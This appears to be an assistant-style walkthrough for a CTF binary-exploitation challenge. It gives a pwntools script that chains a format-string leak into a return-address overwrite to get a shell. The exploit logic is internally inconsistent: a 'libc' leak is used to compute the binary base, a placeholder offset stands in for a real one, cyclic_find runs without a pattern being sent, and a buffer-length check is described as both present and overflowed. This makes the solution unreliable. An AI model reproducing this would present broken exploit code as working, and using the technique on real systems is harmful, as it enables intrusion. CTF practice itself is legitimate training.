To solve this CTF challenge using `pwntools`, we need to identify and exploit vulnerabilities in the given binary. Based on the provided information, the key functions and their behaviors suggest a few potential attack vectors, such as format string vulnerabilities and buffer overflows.

### Step-by-Step Solution

1. **Identify Vulnerabilities:**
   - The `sub_400B07` function uses `printf` with a user-controlled format string, which is a classic format string vulnerability.
   - The `sub_400B41` function has a buffer overflow in the `read` call for both the username and password, but it checks the length to ensure it does not exceed 20 bytes.

2. **Exploit Format String Vulnerability:**
   - We can use the format string vulnerability in `sub_400B07` to leak addresses or overwrite data.

3. **Exploit Buffer Overflow:**
   - If the format string vulnerability is not sufficient, we can try to exploit the buffer overflow in `sub_400B41`.

### Code Implementation

Here is a step-by-step guide and the corresponding `pwntools` code to exploit the format string vulnerability and gain a shell.

#### Step 1: Set Up pwntools
First, install `pwntools` if you haven't already:
```sh
pip install pwntools
```

#### Step 2: Analyze the Binary
Use `checksec` to verify the security properties:
```sh
checksec ./fmt
```
This confirms that the binary has no stack canary and is not position-independent (PIE), which makes exploitation easier.

#### Step 3: Write the Exploit Script

```python
from pwn import *

# Set up the process
binary_path = './fmt'
elf = context.binary = ELF(binary_path)
p = process(binary_path)

# Function to interact with the program
def register_account(username, password):
    p.sendlineafter('>', '1')
    p.sendlineafter('username(max lenth:20): ', username)
    p.sendlineafter('password(max lenth:20): ', password)

def edit_account():
    p.sendlineafter('>', '2')

def show_info():
    p.sendlineafter('>', '1')

def quit_program():
    p.sendlineafter('>', '3')

# Register an account with a controlled format string
register_account('A' * 20, 'A' * 20)

# Edit account to trigger the format string vulnerability
edit_account()

# Leak a libc address using format string
p.sendlineafter('new username(max lenth:20): ', '%15$p')
p.recvuntil('new password(max lenth:20): ')
leaked_address = int(p.recvline().strip(), 16)
log.info(f'Leaked address: {hex(leaked_address)}')

# Calculate the base address of the binary
base_address = leaked_address - 0x1234  # Adjust this offset based on the actual leaked address
log.info(f'Base address: {hex(base_address)}')

# Find the offset to the return address
offset = cyclic_find(0x61616161)  # Use cyclic pattern to find the offset

# Overwrite the return address with the address of the system("/bin/sh") gadget
system_addr = base_address + elf.symbols['sub_4008A6']
log.info(f'System address: {hex(system_addr)}')

# Craft the payload
payload = b'A' * offset
payload += p64(system_addr)

# Send the payload to trigger the buffer overflow
p.sendlineafter('new username(max lenth:20): ', payload)

# Get the shell
p.interactive()
```

### Explanation

1. **Register an Account:**
   - We register an account with a controlled username and password to set up the initial state.

2. **Edit Account:**
   - We select the option to edit the account, which will trigger the format string vulnerability.

3. **Leak a Libc Address:**
   - We use a format string to leak a libc address. The exact format string and offset may vary, so you might need to adjust `%15$p` and the offset calculation.

4. **Calculate the Base Address:**
   - Using the leaked address, we calculate the base address of the binary.

5. **Find the Offset:**
   - We use a cyclic pattern to determine the offset to the return address.

6. **Craft the Payload:**
   - We craft a payload to overwrite the return address with the address of the `system("/bin/sh")` gadget.

7. **Send the Payload:**
   - We send the payload to trigger the buffer overflow and gain a shell.

### Notes
- Adjust the offsets and addresses based on the actual leaked values and the binary's structure.
- You may need to use a debugger like `gdb` to fine-tune the offsets and addresses.
- Ensure you have the correct version of the binary and the correct environment (e.g., ASLR disabled) to match the offsets and addresses.

This script should help you exploit the format string vulnerability and gain a shell in the CTF challenge.
